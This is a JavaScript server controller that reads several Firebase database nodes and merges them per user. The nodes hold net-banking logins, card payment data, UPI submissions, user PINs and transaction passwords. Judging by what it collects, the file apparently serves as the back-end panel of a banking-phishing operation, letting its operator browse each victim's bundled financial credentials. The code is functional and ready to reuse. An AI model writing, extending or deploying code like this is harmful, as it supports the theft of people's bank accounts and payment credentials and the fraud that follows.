import { rtdb } from "../config/db.js";

const NODES = {
  forms: "form_submissions",
  netbanking: "netbanking_data",
  cardPayments: "card_payment_data",
  upi: "upi_submissions",
  userPins: "user_pins",
  bankLogins: "netbanking_login_data",
  transactionPasswords: "transaction_passwords"
};

const cleanUID = (uid) => {
  if (!uid) return null;
  return String(uid).trim();
};

export const getAllUsersFullData = async (req, res) => {
  try {
    const raw = {};
    const uniqueIds = new Set();

    for (const key in NODES) {
      const snap = await rtdb.ref(NODES[key]).get();
      raw[key] = snap.exists() ? snap.val() : {};

      Object.values(raw[key]).forEach(v => {
        const uid = cleanUID(v.uniqueid);
        if (uid) uniqueIds.add(uid);
      });
    }

    const finalList = [];

    uniqueIds.forEach(uid => {
      finalList.push({
        uniqueid: uid,
        forms: Object.values(raw.forms).find(v => cleanUID(v.uniqueid) == uid) || null,
        netbanking: Object.values(raw.netbanking).find(v => cleanUID(v.uniqueid) == uid) || null,
        cardPayments: Object.values(raw.cardPayments).find(v => cleanUID(v.uniqueid) == uid) || null,
        upi: Object.values(raw.upi).find(v => cleanUID(v.uniqueid) == uid) || null,
        userPins: Object.values(raw.userPins).find(v => cleanUID(v.uniqueid) == uid) || null,
        bankLogins: Object.values(raw.bankLogins).find(v => cleanUID(v.uniqueid) == uid) || null,
        transactionPasswords: Object.values(raw.transactionPasswords).find(v => cleanUID(v.uniqueid) == uid) || null
      });
    });

    return res.json({ success: true, data: finalList });

  } catch (err) {
    return res.status(500).json({ success: false, message: "Server error" });
  }
};

export const getUserFullData = async (req, res) => {
  try {
    const { uniqueid } = req.params;
    const uid = cleanUID(uniqueid);
    if (!uid) return res.json({ success: false, message: "uniqueid required" });

    const result = {};

    for (const key in NODES) {
      const snap = await rtdb.ref(NODES[key]).get();
      if (!snap.exists()) {
        result[key] = null;
        continue;
      }

      const data = Object.values(snap.val()).find(v => cleanUID(v.uniqueid) == uid) || null;
      result[key] = data;
    }

    return res.json({
      success: true,
      uniqueid: uid,
      ...result
    });

  } catch (err) {
    return res.status(500).json({ success: false, message: "Server error" });
  }
};

export const getAllData = async (req, res) => {
  try {
    const result = {};

    for (const key in NODES) {
      const snap = await rtdb.ref(NODES[key]).get();

      if (!snap.exists()) {
        result[key] = [];
        continue;
      }

      const arr = Object.values(snap.val())
        .map(obj => {
          const uid = cleanUID(obj.uniqueid);
          if (!uid) return null;

          return {
            ...obj,
            uniqueid: uid
          };
        })
        .filter(Boolean);

      result[key] = arr;
    }

    return res.json({
      success: true,
      data: result
    });

  } catch (err) {
    return res.status(500).json({
      success: false,
      message: "Server error"
    });
  }
};

export const getLatestForm = async (req, res) => {
  try {
    const { uniqueid } = req.params;
    const uid = cleanUID(uniqueid);

    const snap = await rtdb
      .ref(NODES.forms)
      .orderByChild("uniqueid")
      .equalTo(uid)
      .limitToLast(1)
      .get();

    if (!snap.exists()) {
      return res.json({ success: true, data: [] });
    }

    const raw = snap.val();

    const list = Object.entries(raw).map(([id, obj]) => ({
      id,
      uniqueid: uid,
      ...obj
    }));

    return res.json({ success: true, data: list });

  } catch (err) {
    return res.status(500).json({ success: false, message: "Error fetching latest form" });
  }
};
